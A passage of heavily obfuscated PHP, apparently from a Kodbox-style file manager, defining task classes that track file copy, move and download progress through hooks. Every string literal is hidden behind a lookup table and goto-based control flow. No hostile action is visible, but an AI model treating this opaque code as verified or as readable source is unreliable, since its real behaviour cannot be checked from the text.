$†¨’Å©¾[198], $Àş… Î«); $ü”‘¸ÖÌ = Model($†¨’Å©¾[435])->get($’¨¯–ëº, $Àş… Î«); } return $ü”‘¸ÖÌ; } private static function valueSet($Ö¯ÒÜÎŒ, $æøª½Í•) { $®ôŸ =& $_SERVER[§ŒØóıü]; $Àè‚ »° = $®ôŸ[1671]; CacheLock::lock($Àè‚ »°); $µ¿‡»Å = Model($®ôŸ[435])->set($Ö¯ÒÜÎŒ, $æøª½Í•, $®ôŸ[1670]); CacheLock::unlock($Àè‚ »°); return $µ¿‡»Å; } protected static function log($ÚÜØ«ïú) { write_log($ÚÜØ«ïú, $_SERVER[§ŒØóıü][1657]); } private static function cacheClear() { $¼Ş•™ƒõ =& $_SERVER[§ŒØóıü]; Cache::clearMemory(Model($¼Ş•™ƒõ[435])->cacheKey($¼Ş•™ƒõ[1670])); Cache::clearMemory(Model($¼Ş•™ƒõ[435])->cacheKey($¼Ş•™ƒõ[1672])); Model($¼Ş•™ƒõ[1642])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\164\x6f\160"; const STATYS_RUNNING = "\x72\x75\x6e\156\x69\156\147"; const STATYS_KILL = "\153\x69\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($şşê¼·, $ä™Üö»Ó = '', $å­şõÂï = 0, $ãş˜ôˆ = '') { $†æ÷çÉ =& $_SERVER[§ŒØóıü]; if (self::get($şşê¼·)) { return; } $this->task = array($†æ÷çÉ[399] => $şşê¼·, $†æ÷çÉ[1673] => USER_ID, $†æ÷çÉ[1573] => $ãş˜ôˆ, $†æ÷çÉ[453] => $†æ÷çÉ[12], $†æ÷çÉ[33] => $ä™Üö»Ó, $†æ÷çÉ[1070] => $†æ÷çÉ[12], $†æ÷çÉ[792] => $å­şõÂï, $†æ÷çÉ[1674] => 0, $†æ÷çÉ[1675] => 0, $†æ÷çÉ[1676] => 0, $†æ÷çÉ[1677] => timeFloat(), $†æ÷çÉ[1678] => 0, $†æ÷çÉ[1679] => 0, $†æ÷çÉ[1680] => 0, $†æ÷çÉ[1681] => 0, $†æ÷çÉ[755] => $†æ÷çÉ[1632]); $GLOBALS[$†æ÷çÉ[1682]] = 1; Hook::bind($†æ÷çÉ[1637], array($this, $†æ÷çÉ[1683])); Hook::bind($†æ÷çÉ[1684], array($this, $†æ÷çÉ[1685])); $this->startAfter(); Hook::trigger($†æ÷çÉ[1686], $this->task); $this->task[$†æ÷çÉ[1679]] = timeFloat(); } public function end($î‹Ç¦„š = '') { $ââ¥Ê =& $_SERVER[§ŒØóıü]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ââ¥Ê[1679]]) { self::valueSet($this->task[$ââ¥Ê[399]], !1); } $this->isEnd = !0; if ($î‹Ç¦„š) { $this->task[$ââ¥Ê[453]] = $î‹Ç¦„š; } self::log($ââ¥Ê[1687] . $this->task[$ââ¥Ê[399]] . $ââ¥Ê[1688] . sprintf($ââ¥Ê[856], timeFloat() - $this->task[$ââ¥Ê[1677]]) . $ââ¥Ê[1689]); Hook::unbind($ââ¥Ê[1637], array($this, $ââ¥Ê[1683])); Hook::unbind($ââ¥Ê[1684], array($this, $ââ¥Ê[1685])); $this->endAfter(); $€÷‚‡Ï“ = $this->task; $this->task = !1; Hook::trigger($ââ¥Ê[1690], $€÷‚‡Ï“); } public function update($‚Ş½¤É… = 0, $Ù’°É—¨ = false) { $ÛŠı²ÈÅ =& $_SERVER[§ŒØóıü]; $ƒŸü†‡  =& $this->task; if (!$ƒŸü†‡ ) { return; } $ƒŸü†‡ [$ÛŠı²ÈÅ[1674]] += $‚Ş½¤É…; $ƒŸü†‡ [$ÛŠı²ÈÅ[1678]] = timeFloat(); if ($ƒŸü†‡ [$ÛŠı²ÈÅ[792]]) { if ($ƒŸü†‡ [$ÛŠı²ÈÅ[792]] < $ƒŸü†‡ [$ÛŠı²ÈÅ[1674]]) { $ƒŸü†‡ [$ÛŠı²ÈÅ[792]] = $ƒŸü†‡ [$ÛŠı²ÈÅ[1674]]; } $îÊò³ó¾ = timeFloat() - $ƒŸü†‡ [$ÛŠı²ÈÅ[1677]] - $ƒŸü†‡ [$ÛŠı²ÈÅ[1680]]; if ($îÊò³ó¾ <= 0) { $îÊò³ó¾ = 0.001; } $ƒŸü†‡ [$ÛŠı²ÈÅ[1675]] = $ƒŸü†‡ [$ÛŠı²ÈÅ[1674]] / $ƒŸü†‡ [$ÛŠı²ÈÅ[792]]; $ƒŸü†‡ [$ÛŠı²ÈÅ[1676]] = $ƒŸü†‡ [$ÛŠı²ÈÅ[1674]] / $îÊò³ó¾; if ($ƒŸü†‡ [$ÛŠı²ÈÅ[1675]] > 0) { $ƒŸü†‡ [$ÛŠı²ÈÅ[1681]] = $îÊò³ó¾ * (1 - $ƒŸü†‡ [$ÛŠı²ÈÅ[1675]]) / $ƒŸü†‡ [$ÛŠı²ÈÅ[1675]]; } $ƒŸü†‡ [$ÛŠı²ÈÅ[1681]] = $ƒŸü†‡ [$ÛŠı²ÈÅ[1681]] <= 0 ? 0 : $ƒŸü†‡ [$ÛŠı²ÈÅ[1681]]; } $this->updateAfter(); $Ì«í­Â€ = 0.2; if (timeFloat() - $ƒŸü†‡ [$ÛŠı²ÈÅ[1679]] < $Ì«í­Â€ && !$Ù’°É—¨) { return; } $çî£Ó£§ = self::get($ƒŸü†‡ [$ÛŠı²ÈÅ[399]]); $ÙµŸá÷† = $çî£Ó£§[$ÛŠı²ÈÅ[755]]; if ($ÙµŸá÷† == self::STATYS_KILL) { $€÷µÅµİ = array($ÛŠı²ÈÅ[1691] => LNG($ÛŠı²ÈÅ[1692]), $ÛŠı²ÈÅ[1218] => !1); Cache::set($ÛŠı²ÈÅ[1693] . $this->task[$ÛŠı²ÈÅ[399]], $€÷µÅµİ, 30); $this->onKill(); $this->end(); die; } else { if ($ÙµŸá÷† == self::STATYS_STOP) { $—Ÿ ßùº = 2; $çî£Ó£§[$ÛŠı²ÈÅ[1680]] += $—Ÿ ßùº; self::valueSet($ƒŸü†‡ [$ÛŠı²ÈÅ[399]], $çî£Ó£§); sleep($—Ÿ ßùº); $this->update(); return; } } $ƒŸü†‡ [$ÛŠı²ÈÅ[755]] = $ÙµŸá÷† ? $ÙµŸá÷† : $ƒŸü†‡ [$ÛŠı²ÈÅ[755]]; $ƒŸü†‡ [$ÛŠı²ÈÅ[1680]] = $çî£Ó£§[$ÛŠı²ÈÅ[1680]] ? $çî£Ó£§[$ÛŠı²ÈÅ[1680]] : 0; $ƒŸü†‡ [$ÛŠı²ÈÅ[1679]] = timeFloat(); Hook::trigger($ÛŠı²ÈÅ[1694], $ƒŸü†‡ ); self::valueSet($ƒŸü†‡ [$ÛŠı²ÈÅ[399]], $ƒŸü†‡ ); } public function onKillSet($‚’‹™×, $Û©Ó­Ë– = array()) { $this->onKillCall = array($‚’‹™×, $Û©Ó­Ë–); } public function onKill() { $ˆğúÓ™ç =& $_SERVER[§ŒØóıü]; self::log($ˆğúÓ™ç[1687] . $this->task[$ˆğúÓ™ç[399]] . $ˆğúÓ™ç[1695]); Hook::trigger($ˆğúÓ™ç[1696], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ãËÆÆ®à) { $–ãµ¶À =& $_SERVER[§ŒØóıü]; Cache::set($–ãµ¶À[1693] . $this->task[$–ãµ¶À[399]], $ãËÆÆ®à, 60); return $ãËÆÆ®à; } public static function get($¸¨¡óÆÅ) { $ÕÕ¶Ÿ =& $_SERVER[§ŒØóıü]; $¸¡„Ê½ = self::valueGet($¸¨¡óÆÅ); if (is_array($¸¡„Ê½) && $¸¡„Ê½[$ÕÕ¶Ÿ[1697]]) { $¼¾Í©ˆ = ActionApply($¸¡„Ê½[$ÕÕ¶Ÿ[1697]], array($¸¡„Ê½)); $¸¡„Ê½ = is_array($¼¾Í©ˆ) ? $¼¾Í©ˆ : $¸¡„Ê½; } return $¸¡„Ê½; } public static function listData() { $âŸ®¦Ì = self::valueGet(); return array_sort_by($âŸ®¦Ì, $_SERVER[§ŒØóıü][1677], !0); } public static function kill($‘áÎ®ÜŠ) { return self::changeStatus($‘áÎ®ÜŠ, self::STATYS_KILL); } public static function stop($ù‚À ™) { return self::changeStatus($ù‚À ™, self::STATYS_STOP); } public static function restart($‹¶¶™ı) { return self::changeStatus($‹¶¶™ı, self::STATYS_RUNNING); } public static function killAll() { $À›±§Öˆ =& $_SERVER[§ŒØóıü]; $çÔ’Ë¾— = self::listData(); foreach ($çÔ’Ë¾— as $£Å©¢ÉË) { self::kill($£Å©¢ÉË[$À›±§Öˆ[399]]); } sleep(2); foreach ($çÔ’Ë¾— as $£Å©¢ÉË) { self::valueSet($£Å©¢ÉË[$À›±§Öˆ[399]], !1); } } private static function changeStatus($İó¬Ô­ì, $íˆîœè‘) { $‰ÂàÓ‘´ =& $_SERVER[§ŒØóıü]; $ïİ±À¾Ã = self::valueGet($İó¬Ô­ì); if (!$ïİ±À¾Ã) { return !1; } $ïİ±À¾Ã[$‰ÂàÓ‘´[755]] = $íˆîœè‘; self::valueSet($İó¬Ô­ì, $ïİ±À¾Ã); self::log($‰ÂàÓ‘´[1698] . $ïİ±À¾Ã[$‰ÂàÓ‘´[399]] . $‰ÂàÓ‘´[1699] . $íˆîœè‘); return !0; } public static function valueGet($†ßô°× = false) { $ù ‰ä©Ÿ =& $_SERVER[§ŒØóıü]; if ($†ßô°×) { $«è£¦¬» = Model($ù ‰ä©Ÿ[447])->where(array($ù ‰ä©Ÿ[94] => $†ßô°×, $ù ‰ä©Ÿ[33] => $ù ‰ä©Ÿ[1077]))->find(); return $«è£¦¬» ? json_decode($«è£¦¬»[$ù ‰ä©Ÿ[374]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Íö°öÏª = false) { $ìõË™ñï =& $_SERVER[§ŒØóıü]; $ˆÚ•¿º = array($ìõË™ñï[33] => $ìõË™ñï[1077]); if ($Íö°öÏª) { $ˆÚ•¿º[$ìõË™ñï[1673]] = $Íö°öÏª; } $Ô‚ì¥¯° = Model($ìõË™ñï[447])->where($ˆÚ•¿º)->select(); $Ô‚ì¥¯° = $Ô‚ì¥¯° ? $Ô‚ì¥¯° : array(); foreach ($Ô‚ì¥¯° as $ÉŠ£¯´« => $²Èî‡´ğ) { $Ô‚ì¥¯°[$ÉŠ£¯´«] = json_decode($²Èî‡´ğ[$ìõË™ñï[374]], !0); } return $Ô‚ì¥¯°; } public static function valueSet($íîÛÑÖĞ, $ÚúñËñ) { $‡ÚÊ¬Ò =& $_SERVER[§ŒØóıü]; if (!$ÚúñËñ) { return Model($‡ÚÊ¬Ò[447])->where(array($‡ÚÊ¬Ò[94] => $íîÛÑÖĞ, $‡ÚÊ¬Ò[33] => $‡ÚÊ¬Ò[1077]))->delete(); } $¾ÛŸğ˜‰ = json_encode($ÚúñËñ); if (!$¾ÛŸğ˜‰) { ob_start(); var_dump($ÚúñËñ); $Œ€ç‡¨ = ob_get_clean(); self::log($‡ÚÊ¬Ò[1700] . json_encode_force($Œ€ç‡¨)); } if (!$íîÛÑÖĞ || !$ÚúñËñ[$‡ÚÊ¬Ò[399]]) { return !1; } $Œƒ¢®’ = array($‡ÚÊ¬Ò[33] => $‡ÚÊ¬Ò[1077], $‡ÚÊ¬Ò[1673] => USER_ID, $‡ÚÊ¬Ò[94] => $íîÛÑÖĞ, $‡ÚÊ¬Ò[374] => $¾ÛŸğ˜‰); $¦€Â›ßÄ = $‡ÚÊ¬Ò[1701]; CacheLock::lock($¦€Â›ßÄ); Model($‡ÚÊ¬Ò[447])->add($Œƒ¢®’, array(), !0); CacheLock::unlock($¦€Â›ßÄ); } public static function log($š¯‰À—Ñ) { if (!GLOBAL_DEBUG) { return; } write_log($š¯‰À—Ñ, $_SERVER[§ŒØóıü][1702]); } } class TaskFileTransfer extends Task { protected function startAfter() { $¡ô‘¡ =& $_SERVER[§ŒØóıü]; $“Úà¸”Ì =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¡ô‘¡[1703], array($this, $¡ô‘¡[1704])); Hook::bind($¡ô‘¡[1229], array($this, $¡ô‘¡[1705])); Hook::bind($¡ô‘¡[1706], array($this, $¡ô‘¡[1707])); Hook::bind($¡ô‘¡[596], array($this, $¡ô‘¡[1708])); Hook::bind($¡ô‘¡[597], array($this, $¡ô‘¡[1709])); Hook::bind($¡ô‘¡[602], array($this, $¡ô‘¡[1710])); Hook::bind($¡ô‘¡[603], array($this, $¡ô‘¡[1711])); Hook::bind($¡ô‘¡[599], array($this, $¡ô‘¡[1712])); Hook::bind($¡ô‘¡[600], array($this, $¡ô‘¡[1713])); Hook::bind($¡ô‘¡[565], array($this, $¡ô‘¡[1714])); Hook::bind($¡ô‘¡[562], array($this, $¡ô‘¡[1714])); Hook::bind($¡ô‘¡[567], array($this, $¡ô‘¡[1714])); Hook::bind($¡ô‘¡[569], array($this, $¡ô‘¡[1714])); Hook::bind($¡ô‘¡[571], array($this, $¡ô‘¡[1714])); Hook::bind($¡ô‘¡[1715], array($this, $¡ô‘¡[1716])); Hook::bind($¡ô‘¡[587], array($this, $¡ô‘¡[1717])); $this->sourceModelCopyFlag = !1; Hook::bind($¡ô‘¡[1718], array($this, $¡ô‘¡[1719])); Hook::bind($¡ô‘¡[1720], array($this, $¡ô‘¡[1721])); Hook::bind($¡ô‘¡[1722], array($this, $¡ô‘¡[1723])); $“Úà¸”Ì[$¡ô‘¡[1724]] = LNG($¡ô‘¡[1725]); $“Úà¸”Ì[$¡ô‘¡[1726]] = 0; $“Úà¸”Ì[$¡ô‘¡[1727]] = 0; $“Úà¸”Ì[$¡ô‘¡[1070]] = $¡ô‘¡[12]; $“Úà¸”Ì[$¡ô‘¡[1728]] = $¡ô‘¡[12]; $“Úà¸”Ì[$¡ô‘¡[1729]] = 0; $“Úà¸”Ì[$¡ô‘¡[1730]] = 0; $“Úà¸”Ì[$¡ô‘¡[1731]] = 0; if (!$“Úà¸”Ì[$¡ô‘¡[1573]]) { $“Úà¸”Ì[$¡ô‘¡[1573]] = LNG($¡ô‘¡[1732]); } } protected function endAfter() { $‘áˆƒˆí =& $_SERVER[§ŒØóıü]; Hook::unbind($‘áˆƒˆí[1703], array($this, $‘áˆƒˆí[1704])); Hook::unbind($‘áˆƒˆí[1229], array($this, $‘áˆƒˆí[1705])); Hook::unbind($‘áˆƒˆí[1706], array($this, $‘áˆƒˆí[1707])); Hook::unbind($‘áˆƒˆí[596], array($this, $‘áˆƒˆí[1708])); Hook::unbind($‘áˆƒˆí[597], array($this, $‘áˆƒˆí[1709])); Hook::unbind($‘áˆƒˆí[602], array($this, $‘áˆƒˆí[1710])); Hook::unbind($‘áˆƒˆí[603], array($this, $‘áˆƒˆí[1711])); Hook::unbind($‘áˆƒˆí[599], array($this, $‘áˆƒˆí[1712])); Hook::unbind($‘áˆƒˆí[600], array($this, $‘áˆƒˆí[1713])); Hook::unbind($‘áˆƒˆí[565], array($this, $‘áˆƒˆí[1714])); Hook::unbind($‘áˆƒˆí[562], array($this, $‘áˆƒˆí[1714])); Hook::unbind($‘áˆƒˆí[567], array($this, $‘áˆƒˆí[1714])); Hook::unbind($‘áˆƒˆí[569], array($this, $‘áˆƒˆí[1714])); Hook::unbind($‘áˆƒˆí[571], array($this, $‘áˆƒˆí[1714])); Hook::unbind($‘áˆƒˆí[1715], array($this, $‘áˆƒˆí[1716])); Hook::unbind($‘áˆƒˆí[587], array($this, $‘áˆƒˆí[1717])); Hook::unbind($‘áˆƒˆí[1718], array($this, $‘áˆƒˆí[1719])); Hook::unbind($‘áˆƒˆí[1720], array($this, $‘áˆƒˆí[1721])); Hook::unbind($‘áˆƒˆí[1722], array($this, $‘áˆƒˆí[1723])); } public function copyMoveStart($´Õ×¶¤Ú, $ºÚ®¶éê, $šÙ¨ø·, $·ëÚ›ø«) { $îÉ½‚ŒÒ =& $_SERVER[§ŒØóıü]; self::log($îÉ½‚ŒÒ[1733] . $ºÚ®¶éê . $îÉ½‚ŒÒ[70] . $·ëÚ›ø«); $˜Ú¤ó” = rtrim(TEMP_FILES, $îÉ½‚ŒÒ[8]); if (substr($ºÚ®¶éê, 0, strlen($˜Ú¤ó”)) == $˜Ú¤ó”) { return; } if (substr($·ëÚ›ø«, 0, strlen($˜Ú¤ó”)) == $˜Ú¤ó”) { return; } $ö»æÈ¨² =& $this->task; $ö»æÈ¨²[$îÉ½‚ŒÒ[1734]] = KodIO::transferType($´Õ×¶¤Ú, $šÙ¨ø·); $this->update(); } public function updateAfter() { $ïŠİÔ¦† =& $_SERVER[§ŒØóıü]; $şèõ‚ä® =& $this->task; if (!$şèõ‚ä®[$ïŠİÔ¦†[769]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($şèõ‚ä®[$ïŠİÔ¦†[1734]] == $ïŠİÔ¦†[1318]) { return; } self::updateTask($şèõ‚ä®); } private static function updateTask(&$Ë†é¹) { $ ‹Öæ³ç =& $_SERVER[§ŒØóıü]; if ($Ë†é¹[$ ‹Öæ³ç[1734]] == $ ‹Öæ³ç[1200] || $Ë†é¹[$ ‹Öæ³ç[1734]] == $ ‹Öæ³ç[107]) { if ($Ë†é¹[$ ‹Öæ³ç[1728]]) { $Ë†é¹[$ ‹Öæ³ç[1731]] = $Ë†é¹[$ ‹Öæ³ç[1730]] + $Ë†é¹[$ ‹Öæ³ç[1727]]; } } else { if ($Ë†é¹[$ ‹Öæ³ç[1734]] == $ ‹Öæ³ç[1319]) { if ($Ë†é¹[$ ‹Öæ³ç[1728]] == $ ‹Öæ³ç[1200]) { $Ë†é¹[$ ‹Öæ³ç[1731]] = $Ë†é¹[$ ‹Öæ³ç[1730]] + $Ë†é¹[$ ‹Öæ³ç[1727]] * 0.5; } else { if ($Ë†é¹[$ ‹Öæ³ç[1728]] == $ ‹Öæ³ç[107]) { $Ë†é¹[$ ‹Öæ³ç[1731]] = $Ë†é¹[$ ‹Öæ³ç[1730]] + $Ë†é¹[$ ‹Öæ³ç[1726]] * 0.5 + $Ë†é¹[$ ‹Öæ³ç[1727]] * 0.5; } } } } $Ë†é¹[$ ‹Öæ³ç[1675]] = $Ë†é¹[$ ‹Öæ³ç[1731]] / $Ë†é¹[$ ‹Öæ³ç[769]]; if ($Ë†é¹[$ ‹Öæ³ç[1675]] > 0) { $˜³ä³ = timeFloat() - $Ë†é¹[$ ‹Öæ³ç[1677]] - $Ë†é¹[$ ‹Öæ³ç[1680]]; $Ë†é¹[$ ‹Öæ³ç[1681]] = $˜³ä³ * (1 - $Ë†é¹[$ ‹Öæ³ç[1675]]) / $Ë†é¹[$ ‹Öæ³ç[1675]]; } } public function addPath($§Îò«É) { $Å¢ùüåª =& $_SERVER[§ŒØóıü]; if (!$§Îò«É) { return; } $Õ©ßÅ² =& $this->task; $Ÿ™¸ ş = IO::infoWithChildren($§Îò«É); $ä“Åâ®… = $Õ©ßÅ²[$Å¢ùüåª[1735]] ? $Õ©ßÅ²[$Å¢ùüåª[1735]][$Å¢ùüåª[1736]] : 0; $Õ©ßÅ²[$Å¢ùüåª[1735]] = array($Å¢ùüåª[1736] => $ä“Åâ®… + 1, $Å¢ùüåª[420] => $Ÿ™¸ ş[$Å¢ùüåª[32]], $Å¢ùüåª[84] => $Ÿ™¸ ş[$Å¢ùüåª[84]], $Å¢ùüåª[509] => $Ÿ™¸ ş[$Å¢ùüåª[509]] ? $Ÿ™¸ ş[$Å¢ùüåª[509]] : $Ÿ™¸ ş[$Å¢ùüåª[84]]); if ($Ÿ™¸ ş[$Å¢ùüåª[33]] == $Å¢ùüåª[200]) { $Õ©ßÅ²[$Å¢ùüåª[792]] += 1; } else { $Õ©ßÅ²[$Å¢ùüåª[792]] += $Ÿ™¸ ş[$Å¢ùüåª[79]][$Å¢ùüåª[77]]; if ($Ÿ™¸ ş[$Å¢ùüåª[402]]) { $Õ©ßÅ²[$Å¢ùüåª[792]] += $Ÿ™¸ ş[$Å¢ùüåª[79]][$Å¢ùüåª[78]] + 1; } } $Õ©ßÅ²[$Å¢ùüåª[769]] += $Ÿ™¸ ş[$Å¢ùüåª[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($¯•ÜÕëç) { } public function sourceAddHashEnd($éşöâÛ‘) { } public function sourceAddFileStart($’±‹¤²) { $À•Äöï‚ =& $_SERVER[§ŒØóıü]; $©¿Ù—öÇ =& $this->task; $©¿Ù—öÇ[$À•Äöï‚[1726]] = $’±‹¤²[$À•Äöï‚[76]]; $©¿Ù—öÇ[$À•Äöï‚[1724]] = $’±‹¤²[$À•Äöï‚[32]]; $©¿Ù—öÇ[$À•Äöï‚[1070]] = $’±‹¤²[$À•Äöï‚[32]]; $©¿Ù—öÇ[$À•Äöï‚[1737]] = $’±‹¤²[$À•Äöï‚[84]]; $this->update(); } public function sourceAddFileEnd($ˆ€£Œáé) { $‹…â”–Ù =& $_SERVER[§ŒØóıü]; $‡Ğ ½Ÿ“ =& $this->task; $‡Ğ ½Ÿ“[$‹…â”–Ù[1731]] += $ˆ€£Œáé[$‹…â”–Ù[76]]; $‡Ğ ½Ÿ“[$‹…â”–Ù[1737]] = $ˆ€£Œáé[$‹…â”–Ù[84]]; $this->update(1); } public function copyFileStart($êÑµØÑ , $Ûè†ç©ë, $ëŒ¦çĞ, $íòÍ÷©, $ÌÅÖ¹ö, $“£‚¨×¨) { $Ü®»Ğíï =& $_SERVER[§ŒØóıü]; $¦Ÿñâ¹  = $ÌÅÖ¹ö; if ($¦Ÿñâ¹  == $GLOBALS[$Ü®»Ğíï[1738]]) { $¦Ÿñâ¹  = $GLOBALS[$Ü®»Ğíï[1739]]; } $GLOBALS[$Ü®»Ğíï[1739]] = $ÌÅÖ¹ö; $GLOBALS[$Ü®»Ğíï[1738]] = $“£‚¨×¨; $”Ù¬È‰ß =& $this->task; $”Ù¬È‰ß[$Ü®»Ğíï[1724]] = $¦Ÿñâ¹ ; $”Ù¬È‰ß[$Ü®»Ğíï[1726]] = (int) $êÑµØÑ ->size($Ûè†ç©ë); $”Ù¬È‰ß[$Ü®»Ğíï[1727]] = 0; $”Ù¬È‰ß[$Ü®»Ğíï[1070]] = $Ü®»Ğíï[12]; $”Ù¬È‰ß[$Ü®»Ğíï[1728]] = $Ü®»Ğíï[12]; $”Ù¬È‰ß[$Ü®»Ğíï[1729]] = 0; $öéËõ†“ = $”Ù¬È‰ß[$Ü®»Ğíï[1726]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($”Ù¬È‰ß[$Ü®»Ğíï[399]] . $Ü®»Ğíï[1740]); if ($öéËõ†“ && file_exists(get_path_father($íòÍ÷©))) { Cache::set($”Ù¬È‰ß[$Ü®»Ğíï[399]] . $Ü®»Ğíï[1740], $íòÍ÷©); $”Ù¬È‰ß[$Ü®»Ğíï[1697]] = array($Ü®»Ğíï[1741], $Ü®»Ğíï[1742]); } $this->update(0, $öéËõ†“); } public static function updateCopyLocalFileSize($¬Â è¸Ò) { $ĞÎÀöû =& $_SERVER[§ŒØóıü]; $ÃĞÎ„õ = Cache::get($¬Â è¸Ò[$ĞÎÀöû[399]] . $ĞÎÀöû[1740]); if (!$ÃĞÎ„õ || !file_exists($ÃĞÎ„õ)) { return $¬Â è¸Ò; } $¬Â è¸Ò[$ĞÎÀöû[1727]] = @filesize($ÃĞÎ„õ); $¬Â è¸Ò[$ĞÎÀöû[1731]] += $¬Â è¸Ò[$ĞÎÀöû[1727]]; self::updateTask($¬Â è¸Ò); return $¬Â è¸Ò; } public function copyFileEnd($«Ë©ˆÜ·, $ÔÁ½„Ü², $äÌ“­, $ÀØÅÃ»Í, $‡ı´Šã, $«Â¯ß”í) { $ÇÎâ•ªï =& $_SERVER[§ŒØóıü]; $«¾æìÄ =& $this->task; $«¾æìÄ[$ÇÎâ•ªï[1727]] = $«¾æìÄ[$ÇÎâ•ªï[1726]]; $«¾æìÄ[$ÇÎâ•ªï[1728]] = $ÇÎâ•ªï[12]; unset($«¾æìÄ[$ÇÎâ•ªï[1697]]); if ($‡ı´Šã == $«¾æìÄ[$ÇÎâ•ªï[1724]]) { $«¾æìÄ[$ÇÎâ•ªï[1730]] += $«¾æìÄ[$ÇÎâ•ªï[1726]]; $«¾æìÄ[$ÇÎâ•ªï[1731]] = $«¾æìÄ[$ÇÎâ•ªï[1730]]; $‡ğ°İû² = 1; if (isset($«¾æìÄ[$ÇÎâ•ªï[1737]]) && $«¾æìÄ[$ÇÎâ•ªï[1737]] == $ÔÁ½„Ü²) { $‡ğ°İû² = 0; } $this->update($‡ğ°İû²); } else { $this->update(); $«¾æìÄ[$ÇÎâ•ªï[1727]] = 0; } Cache::remove($«¾æìÄ[$ÇÎâ•ªï[399]] . $ÇÎâ•ªï[1740]); self::log($ÇÎâ•ªï[1743] . $ÔÁ½„Ü² . $ÇÎâ•ªï[70] . $ÀØÅÃ»Í . $ÇÎâ•ªï[231] . $‡ı´Šã . $ÇÎâ•ªï[1744] . $«¾æìÄ[$ÇÎâ•ªï[1724]]); } public function updateFileEnd($¿ƒ·æÆù, $ƒëŠ”“·) { $¯ Î°µ™ =& $_SERVER[§ŒØóıü]; $±âáÇÊ =& $this->task; $±âáÇÊ[$¯ Î°µ™[1724]] = $¿ƒ·æÆù; $±âáÇÊ[$¯ Î°µ™[1726]] = $ƒëŠ”“·; $±âáÇÊ[$¯ Î°µ™[1730]] += $ƒëŠ”“·; $±âáÇÊ[$¯ Î°µ™[1731]] = $±âáÇÊ[$¯ Î°µ™[1730]]; $this->update(1); self::log($¯ Î°µ™[1745] . $¿ƒ·æÆù); } public function sourceModelCopy($ÎŒúÅºï) { $à°ğõ–¦ =& $_SERVER[§ŒØóıü]; $š“îÄ• = $ÎŒúÅºï[0]; $®©‚ç– = $ÎŒúÅºï[1]; $ªÃ‚·Ó =& $this->task; $this->sourceModelCopyFlag = !0; $Ş¨³‹î = 0; switch ($š“îÄ•) { case $à°ğõ–¦[563]: $Ş¨³‹î = 1; break; case $à°ğõ–¦[566]: $ªÃ‚·Ó[$à°ğõ–¦[1724]] = $®©‚ç–[$à°ğõ–¦[32]]; break; case $à°ğõ–¦[568]: $Ş¨³‹î = intval($ÎŒúÅºï[$à°ğõ–¦[380]] * 0.4); break; case $à°ğõ–¦[570]: $Ş¨³‹î = intval($ÎŒúÅºï[$à°ğõ–¦[380]] * 0.2); break; case $à°ğõ–¦[572]: $Ş¨³‹î = intval($ÎŒúÅºï[$à°ğõ–¦[380]] * 0.4); break; } $this->update($Ş¨³‹î); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Ò¼™Àí¶, $ŞÜ±ï³Á) { $Çà÷òÑÄ =& $_SERVER[§ŒØóıü]; $this->sourceModelCopyFlag = !0; $ÔÛå­÷Á = 1; if (isset($Ò¼™Àí¶[$Çà÷òÑÄ[79]])) { $ÔÛå­÷Á = $Ò¼™Àí¶[$Çà÷òÑÄ[79]][$Çà÷òÑÄ[77]]; $ÔÛå­÷Á = $ÔÛå­÷Á + $Ò¼™Àí¶[$Çà÷òÑÄ[79]][$Çà÷òÑÄ[78]] + 1; } $this->update($ÔÛå­÷Á); $this->sourceModelCopyFlag = !1; } public function sourceMove($Áš¤Í¸Ù) { $this->sourceRemove($Áš¤Í¸Ù, !1); } public function curlProgress($ô«À¸ø, $Ñ»¢±ùÁ, $¨ÍÖß¢ü, $„Àãé‹Ñ, $ĞĞ°ó·) { $éÖçÊ×ª =& $_SERVER[§ŒØóıü]; $¹ĞÌ´’ş =& $this->task; if ($ĞĞ°ó· > 0) { $¹ĞÌ´’ş[$éÖçÊ×ª[1070]] = $éÖçÊ×ª[1746]; $¹ĞÌ´’ş[$éÖçÊ×ª[1728]] = $éÖçÊ×ª[107]; if ($¹ĞÌ´’ş[$éÖçÊ×ª[1726]]) { $¹ĞÌ´’ş[$éÖçÊ×ª[1727]] = $ĞĞ°ó·; } if ($¹ĞÌ´’ş[$éÖçÊ×ª[1729]]) { $¹ĞÌ´’ş[$éÖçÊ×ª[1727]] = $ĞĞ°ó· + $¹ĞÌ´’ş[$éÖçÊ×ª[1729]]; } } else { if ($¨ÍÖß¢ü > 0) { if ($¹ĞÌ´’ş[$éÖçÊ×ª[1726]] == $Ñ»¢±ùÁ) { $¹ĞÌ´’ş[$éÖçÊ×ª[1727]] = $¨ÍÖß¢ü; $¹ĞÌ´’ş[$éÖçÊ×ª[1070]] = $éÖçÊ×ª[1747]; $¹ĞÌ´’ş[$éÖçÊ×ª[1728]] = $éÖçÊ×ª[1200]; } } } $this->update(); } public function curlProgressStart($Îê—ÍÀ™) { } public function curlProgressEnd($’£©ğÅ‚) { $‡Èö·Ûî =& $_SERVER[§ŒØóıü]; $†âİö¹ =& $this->task; $µ°œ¹ = curl_getinfo($’£©ğÅ‚); $·«àãËÏ = $µ°œ¹[$‡Èö·Ûî[1748]]; if ($·«àãËÏ == -1) { $·«àãËÏ = $µ°œ¹[$‡Èö·Ûî[1749]]; } if ($†âİö¹[$‡Èö·Ûî[1728]] == $‡Èö·Ûî[107] && $·«àãËÏ) { $†âİö¹[$‡Èö·Ûî[1729]] += $·«àãËÏ; } $this->update(); } } goto AªøÍÖÄ„«; d’œÏ¥Ôñ£: define($_SERVER[§ŒØóıü][604], $_SERVER[§ŒØóıü][605]); $cxmguitfbp = $_SERVER[§ŒØóıü][606]; if (strlen($cxmguitfbp) < $_SERVER[§ŒØóıü][607]) { die; } goto FŠ³ÕÓò¿é; BÕœÓê×ì©: class 